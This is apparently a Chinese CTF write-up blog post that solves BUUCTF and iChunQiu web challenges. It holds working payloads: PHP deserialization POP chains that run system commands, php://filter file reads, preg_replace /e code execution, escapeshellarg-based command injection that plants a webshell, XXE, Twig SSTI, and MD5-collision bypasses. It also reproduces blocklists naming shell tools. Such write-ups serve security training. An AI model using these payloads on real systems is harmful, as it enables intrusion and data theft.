v3 {system(\u0026#39;cat index.php\u0026#39;)} // compatible v3 [网鼎杯 2020 朱雀组]phpweb POST /index.php HTTP/1.1 Host: ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 128 Origin: http://ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81 Connection: close Referer: http://ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81/index.php Upgrade-Insecure-Requests: 1 func=1\u0026amp;p=1 可以发现是传入函数和参数来进行利用，尝试eval等函数发现不行，尝试file_get_contents来读取文件内容，但不知道flag在哪个地方，所以先读取目前文件内容\n\u0026lt;?php $disable_fun = array(\u0026#34;exec\u0026#34;, \u0026#34;shell_exec\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;passthru\u0026#34;, \u0026#34;proc_open\u0026#34;, \u0026#34;show_source\u0026#34;, \u0026#34;phpinfo\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;dl\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;proc_terminate\u0026#34;, \u0026#34;touch\u0026#34;, \u0026#34;escapeshellcmd\u0026#34;, \u0026#34;escapeshellarg\u0026#34;, \u0026#34;assert\u0026#34;, \u0026#34;substr_replace\u0026#34;, \u0026#34;call_user_func_array\u0026#34;, \u0026#34;call_user_func\u0026#34;, \u0026#34;array_filter\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_map\u0026#34;, \u0026#34;registregister_shutdown_function\u0026#34;, \u0026#34;register_tick_function\u0026#34;, \u0026#34;filter_var\u0026#34;, \u0026#34;filter_var_array\u0026#34;, \u0026#34;uasort\u0026#34;, \u0026#34;uksort\u0026#34;, \u0026#34;array_reduce\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_walk_recursive\u0026#34;, \u0026#34;pcntl_exec\u0026#34;, \u0026#34;fopen\u0026#34;, \u0026#34;fwrite\u0026#34;, \u0026#34;file_put_contents\u0026#34;); function gettime($func, $p) { $result = call_user_func($func, $p); $a = gettype($result); if ($a == \u0026#34;string\u0026#34;) { return $result; } else { return \u0026#34;\u0026#34;; } } class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } $func = $_REQUEST[\u0026#34;func\u0026#34;]; $p = $_REQUEST[\u0026#34;p\u0026#34;]; if ($func != null) { $func = strtolower($func); if (!in_array($func, $disable_fun)) { echo gettime($func, $p); } else { die(\u0026#34;Hacker...\u0026#34;); } } 可以看到过滤了很多函数，观察到有Test类，可以尝试反序列化利用，并且没有过滤unserialize函数，直接构造POP链来查找flag所在位置并读取内容\nO:4:\u0026#34;Test\u0026#34;:2:{s:1:\u0026#34;p\u0026#34;;s:22:\u0026#34;cat /tmp/flagoefiu4r93\u0026#34;;s:4:\u0026#34;func\u0026#34;;s:6:\u0026#34;system\u0026#34;;} [BSidesCF 2020]Had a bad day php伪协议读文件，必须要base64编码才能回显\nphp://filter/read=convert.base64-encode/resource=index.php 先看index，发现有过滤\n\u0026lt;?php $file = $_GET[\u0026#39;category\u0026#39;]; if (isset($file)) { if (strpos($file, \u0026#34;woofers\u0026#34;) !== false || strpos($file, \u0026#34;meowers\u0026#34;) !== false || strpos($file, \u0026#34;index\u0026#34;)) { include($file . \u0026#39;.php\u0026#39;); } else { echo \u0026#34;Sorry, we currently only support woofers and meowers.\u0026#34;; } } payload必须要带有woofers、meowers、index才可以被包含，所以使用如下payload\nphp://filter/read=convert.base64-encode/write=woofers/resource=flag [BJDCTF2020]ZJCTF，不过如此 \u0026lt;?php error_reporting(0); $text = $_GET[\u0026#34;text\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; if(isset($text)\u0026amp;\u0026amp;(file_get_contents($text,\u0026#39;r\u0026#39;)===\u0026#34;I have a dream\u0026#34;)){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;h1\u0026gt;\u0026#34;.file_get_contents($text,\u0026#39;r\u0026#39;).\u0026#34;\u0026lt;/h1\u0026gt;\u0026lt;/br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ die(\u0026#34;Not now!\u0026#34;); } include($file); //next.php } else{ highlight_file(__FILE__); } ?\u0026gt; 利用php://input或者php://data来向文件写入内容，再利用php://filter来读取文件内容\nGET /?text=php://input\u0026amp;file=php://filter/read=convert.base64-encode/resource=next.php HTTP/1.1 Host: b3ec03ec-6e5d-451f-b4f4-44bde10654ee.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 14 I have a dream 得到内容\n\u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach ($_GET as $re =\u0026gt; $str) { echo complex($re, $str) . \u0026#34;\\n\u0026#34;; } function getFlag() { @eval($_GET[\u0026#39;cmd\u0026#39;]); } 观察到preg_replace函数中使用了/e，并且php版本为PHP/5.6.40，存在RCE漏洞\n/next.php?\\.*=${getflag()}\u0026amp;cmd=system(\u0026#39;cat+/flag\u0026#39;); /next.php?\\S*=${getflag()}\u0026amp;cmd=system(\u0026#39;cat+/flag\u0026#39;); 因为在GET传参时.会变成_所以需要使用第二个payload\n[BUUCTF 2018]Online Tool \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } if (!isset($_GET[\u0026#39;host\u0026#39;])) { highlight_file(__FILE__); } else { $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellarg($host); $sandbox = md5(\u0026#34;glzjin\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); echo \u0026#39;you are in sandbox \u0026#39; . $sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34; . $host); } HTTP_X_FORWARDED_FOR就是X_FORWARDED_FOR头，REMOTE_ADDR就是客户端IP，从题目来看，无所谓\nescapeshellarg()把字符串转义成shell命令参数，把字符串中的单引号变成转义的单引号，并把这个转义后的单引号用两个单引号引起来。如\n\u0026#39; \u0026lt;?php echo `pwd` ?\u0026gt; -oG 1.php \u0026#39; \u0026#39;\u0026#39;\\\u0026#39;\u0026#39; \u0026lt;?php echo `pwd` ?\u0026gt; -oG 1.php \u0026#39;\\\u0026#39;\u0026#39;\u0026#39; escapeshellarg — Escape a string to be used as a shell argument escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() and the backtick operator. On Windows, escapeshellarg() instead replaces percent signs, exclamation marks (delayed variable substitution) and double quotes with spaces and adds double quotes around the string. Furthermore, each streak of consecutive backslashes (\\) is escaped by one additional backslash. escapeshellarg()转义所有元字符，单纯的转义，不加单引号，如\n\u0026#39; \u0026lt;?php echo `pwd` ?\u0026gt; -oG 1.php \u0026#39; \u0026#39;\u0026#39;\\\u0026#39;\u0026#39; \u0026lt;?php echo `pwd` ?\u0026gt; -oG 1.php \u0026#39;\\\u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39; \\\u0026lt;\\?php echo \\`pwd\\` \\?\\\u0026gt; -oG 1.php \u0026#39;\\\\\u0026#39;\u0026#39;\u0026#39; escapeshellcmd — Escape shell metacharacters escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands. This function should be used to make sure that any data coming from user input is escaped before this data is passed to the exec() or system() functions, or to the backtick operator. Following characters are preceded by a backslash: \u0026amp;#;`|*?~\u0026lt;\u0026gt;^()[]{}$\\, \\x0A and \\xFF. \u0026#39; and \u0026#34; are escaped only if they are not paired. On Windows, all these characters plus % and ! are preceded by a caret (^). 可以看到经过这两个函数的共同作用后，中间的命令逃逸了出来，所以我们可以尝试利用\n观察到给定的命令为echo system(\u0026quot;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026quot; . $host);，了解到nmap有一个-oG参数可以把扫描内容输出到文件中，而我们可以让恶意命令逃逸出来，所以我们可以输出为任意格式的文件，同时逃逸出对应格式文件的恶意代码，从而拿到shell\n[GXYCTF2019]禁止套娃 啥也没有，扫一下目录，发现.git泄露，githack下载下来\n\u0026lt;?php include \u0026#34;flag.php\u0026#34;; echo \u0026#34;flag在哪里呢\u0026lt;br\u0026gt;\u0026#34;; if (isset($_GET[\u0026#39;exp\u0026#39;])) { if (!preg_match(\u0026#39;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { if (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+\\((?R)?\\)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;])) { if (!preg_match(\u0026#39;/et|na|info|dec|bin|hex|oct|pi|log/i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { // echo $_GET[\u0026#39;exp\u0026#39;]; @eval($_GET[\u0026#39;exp\u0026#39;]); } else { die(\u0026#34;还差一点哦！\u0026#34;); } } else { die(\u0026#34;再好好想想！\u0026#34;); } } else { die(\u0026#34;还想读flag 臭弟弟\u0026#34;); } } // highlight_file(__FILE__); 无参数RCE，过滤的比较少，var_dump一下，但var_dump必须要参数，所以构造出一个.，localeconv()第一个返回的就是.，所以使用current()把第一个内容取出来，在用scandir()获取一下目录内容\n/?exp=var_dump(scandir(current(localeconv()))); 发现flag.php，使用readfile()读取\n/?exp=readfile(next(array_reverse(scandir(current(localeconv()))))); 具体payload看数组内容排列\n[NCTF2019]Fake XML cookbook XXE(XML External Entity)\n可以利用外部实体进行注入，报文格式为：\nPOST /doLogin.php HTTP/1.1 Host: 11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: application/xml, text/xml, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/xml;charset=utf-8 X-Requested-With: XMLHttpRequest Content-Length: 57 Origin: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81 Connection: close Referer: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81/ \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;1\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;1\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 我们可以对发送的XML类型数据进行修改，注入外部实体，同时在返回的用户名和密码数据中把恶意操作回显出来\nPOST /doLogin.php HTTP/1.1 Host: 11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: application/xml, text/xml, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/xml;charset=utf-8 X-Requested-With: XMLHttpRequest Content-Length: 145 Origin: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81 Connection: close Referer: http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81/ \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY test SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;test;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;1\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; [GWCTF 2019]我有一个数据库 啥也没有，扫一下目录，发现有phpmyadmin，进去也是啥也没有\n可能是phpmyadmin本身有漏洞，直接google到POC，但我没找到，开xray扫出来了。。。\n![image-20240309111211220](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309111211220.png)\n文件包含漏洞，直接读取flag\n[BJDCTF2020]Mark loves cat githack\n\u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach ($_POST as $x =\u0026gt; $y) { $$x = $y; } foreach ($_GET as $x =\u0026gt; $y) { $$x = $$y; } foreach ($_GET as $x =\u0026gt; $y) { if ($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;) { exit($handsome); } } if (!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])) { exit($yds); } if ($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;) { exit($is); } echo \u0026#34;the flag is: \u0026#34; . $flag; payload\nindex.php?yds=flag [WUSTCTF2020]朴实无华 啥也没有，目录扫描，得到robots.txt和一个fake_flag.php，fake_flag.php响应报文中有另一个文件内容，如下\n\u0026lt;?php header(\u0026#39;Content-type:text/html;charset=utf-8\u0026#39;); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if(intval($num) \u0026lt; 2020 \u0026amp;\u0026amp; intval($num + 1) \u0026gt; 2021){ echo \u0026#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.\u0026lt;/br\u0026gt;\u0026#34;; }else{ die(\u0026#34;金钱解决不了穷人的本质问题\u0026#34;); } }else{ die(\u0026#34;去非洲吧\u0026#34;); } //level 2 if (isset($_GET[\u0026#39;md5\u0026#39;])){ $md5=$_GET[\u0026#39;md5\u0026#39;]; if ($md5==md5($md5)) echo \u0026#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.\u0026lt;/br\u0026gt;\u0026#34;; else die(\u0026#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\u0026#34;); }else{ die(\u0026#34;去非洲吧\u0026#34;); } //get flag if (isset($_GET[\u0026#39;get_flag\u0026#39;])){ $get_flag = $_GET[\u0026#39;get_flag\u0026#39;]; if(!strstr($get_flag,\u0026#34; \u0026#34;)){ $get_flag = str_ireplace(\u0026#34;cat\u0026#34;, \u0026#34;wctf2020\u0026#34;, $get_flag); echo \u0026#34;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.\u0026lt;/br\u0026gt;\u0026#34;; system($get_flag); }else{ die(\u0026#34;快到非洲了\u0026#34;); } }else{ die(\u0026#34;去非洲吧\u0026#34;); } ?\u0026gt; level1用科学记数法绕过，因为php版本为5.5，payload\n/fl4g.php?num=1e5 level2经典绕过，payload\n/fl4g.php?num=1e5\u0026amp;md5=0e215962017 level3空格绕过，用${IFS}或者$IFS$1绕过，cat也被过滤，可以用tac查看，payload\n/fl4g.php?num=1e5\u0026amp;md5=0e215962017\u0026amp;get_flag=tac${IFS}./fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [BJDCTF2020]Cookie is so stable SSTI\n直接FUZZ\n{{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;id\u0026#34;)}} [安洵杯 2019]easy_web GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd= HTTP/1.1 观察URL，先解码img内容，\n![image-20240309162624969](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309162624969.png)\n可以知道先两次base64，再一次hex，得到网页上显示的图片，根据这个信息，我们可以通过这个方式把网站源码也经过这种方式回显出来\n![image-20240309162921129](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309162921129.png)\nGET /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3\u0026amp;cmd= HTTP/1.1 HTTP/1.1 200 OK Server: openresty Date: Sat, 09 Mar 2024 08:30:04 GMT Content-Type: text/html;charset=utf-8 Content-Length: 1955 Connection: close Vary: Accept-Encoding X-Powered-By: PHP/7.1.33 Cache-Control: no-cache \u0026lt;img src=\u0026#39;data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;md5 is funny ~\u0026lt;html\u0026gt; \u0026lt;style\u0026gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; } \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 解码回显的内容，得到\n\u0026lt;?php error_reporting(E_ALL || ~E_NOTICE); header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!isset($_GET[\u0026#39;img\u0026#39;]) || !isset($_GET[\u0026#39;cmd\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd=\u0026#39;); $file = hex2bin(base64_decode(base64_decode($_GET[\u0026#39;img\u0026#39;]))); $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;, \u0026#34;\u0026#34;, $file); if (preg_match(\u0026#34;/flag/i\u0026#34;, $file)) { echo \u0026#39;\u0026lt;img src =\u0026#34;./ctf3.jpeg\u0026#34;\u0026gt;\u0026#39;; die(\u0026#34;xixiï½ no flag\u0026#34;); } else { $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34; . $txt . \u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo $cmd; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if (preg_match(\u0026#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\u0026#39;|\\\u0026#34;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u0026lt;|\u0026gt;/i\u0026#34;, $cmd)) { echo (\u0026#34;forbid ~\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } } 可以知道过滤了很多命令，而且只需要一个md5的强比较绕过就行，payload\na=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 \u0026amp; b=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 现在就可以执行命令了，要读取flag还要绕过preg_match()，paylaod\n/index.php?cmd=ca\\t+/flag [MRCTF2020]Ezpop \u0026lt;?php //flag is in flag.php //WTF IS THIS? //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95 //And Crack It! class Modifier { protected $var; public function append($value) { include($value); } public function __invoke() { $this-\u0026gt;append($this-\u0026gt;var); } } class Show { public $source; public $str; public function __construct($file = \u0026#39;index.php\u0026#39;) { $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39; . $this-\u0026gt;source . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString() { return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup() { if (preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $p; public function __construct() { $this-\u0026gt;p = array(); } public function __get($key) { $function = $this-\u0026gt;p; return $function(); } } if (isset($_GET[\u0026#39;pop\u0026#39;])) { @unserialize($_GET[\u0026#39;pop\u0026#39;]); } else { $a = new Show; highlight_file(__FILE__); } POP\n__wakeup()--\u0026gt;__toString()--\u0026gt;__get()--\u0026gt;__invoke()--\u0026gt;append() 注意是include()包含的文件需要转换成base64才能回显flag，exp如下：\n\u0026lt;?php class Modifier { protected $var = \u0026#34;php://filter/read=convert.base64-encode/resource=flag.php\u0026#34;; public function append($value) { include($value); } public function __invoke() { $this-\u0026gt;append($this-\u0026gt;var); } } class Show { public $source; public $str; public function __construct() { } public function __toString() { return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup() { if (preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $p; public function __construct() { $this-\u0026gt;p = new Modifier(); } public function __get($key) { $function = $this-\u0026gt;p; return $function(); } } $a = new Show(); $a-\u0026gt;str = new Test(); $b = new Test(); $show = new Show(); $show-\u0026gt;source = $a; $show-\u0026gt;str = $b; echo urlencode(serialize($show)); [安洵杯 2019]easy_serialize_php ","permalink":"//localhost:1313/posts/buuctf-web-2/","tags":["WEB"],"title":"BUUCTF WEB 2"},{"categories":["CTF"],"content":"iChunQiu WEB 1 禁止访问 client-ip: 192.168.1.1 签到 if (a.currentLevel \u0026gt; a.maxLevel) { var IAvaDcnZ1 = prompt(\u0026#34;\\x43\\x6f\\x6e\\x67\\x72\\x61\\x74\\x75\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x73\\x2c\\x20\\x70\\x6c\\x65\\x61\\x73\\x65\\x20\\x65\\x6e\\x74\\x65\\x72\\x20\\x79\\x6f\\x75\\x72\\x20\\x6e\\x69\\x63\\x6b\\x6e\\x61\\x6d\\x65\\x3a\u0026#34;)[\u0026#39;\\x74\\x72\\x69\\x6d\u0026#39;](); $.ajax({ url: \u0026#39;\\x66\\x6c\\x61\\x67\\x2e\\x70\\x68\\x70\u0026#39;, type: \u0026#39;\\x50\\x4f\\x53\\x54\u0026#39;, data: \u0026#39;\\x6e\\x69\\x63\\x6b\\x6e\\x61\\x6d\\x65\\x3d\u0026#39; + IAvaDcnZ1, success: function (StRvT3) { var StRvT3 = StRvT3; console[\u0026#39;\\x6c\\x6f\\x67\u0026#39;](StRvT3) } }) window[\u0026#34;\\x61\\x6c\\x65\\x72\\x74\u0026#34;](\u0026#34;\\u606d\\u559c\\u4f60\\u5f97\\u5230\\x66\\x6c\\x61\\x67\\u4e86\\uff0c\\u53bb\\u5bfb\\u627e\\u5427\\x7e\\uff01\u0026#34;); a.fire(\u0026#34;gameEnd\u0026#34;); return; } 转成字符串即可\n遗留的压缩包 \u0026lt;?php # leet if (md5($_GET[\u0026#39;pwd\u0026#39;]) == \u0026#39;217f81b8ff0a1ab138a8e1bdc031262e\u0026#39;) { eval($_POST[\u0026#39;1337\u0026#39;]); } www.zip发现源码，直接读flag即可\nWeb 01 \u0026lt;?php $f = $_GET[\u0026#34;file\u0026#34;]; if(!isset($f)){ $f = \u0026#39;config\u0026#39;; // flag in flag.php } include($f.\u0026#39;.php\u0026#39;); echo \u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;.$img.\u0026#39;\u0026#34; alt=\u0026#34;Err\u0026#34; /\u0026gt;\u0026#39;; ?\u0026gt; \u0026lt;!-- .bak --\u0026gt; 文件读取时没有回显，需要进行base64编码才能正常显示\nphp://filter/read=string.base64/resource=flag.php php://filter/read=convert.base64-encode/resource=flag.php php://filter/convert.base64-encode/resource=flag.php Web 12 \u0026lt;?php include(\u0026#34;secret.php\u0026#34;); function waf($s) { $blocklist = \u0026#39;php_engineer\u0026#39;; if (strpos($s, $blocklist) !== false) { die(\u0026#39;Could you hack me?!\u0026#39;); } } if (isset($_POST[\u0026#39;php_engineer\u0026#39;])) { if (!strcmp($elephant, $_POST[\u0026#39;php_engineer\u0026#39;])) { $data = file_get_contents(\u0026#39;php://input\u0026#39;); waf($data); die(\u0026#34;FLAG: 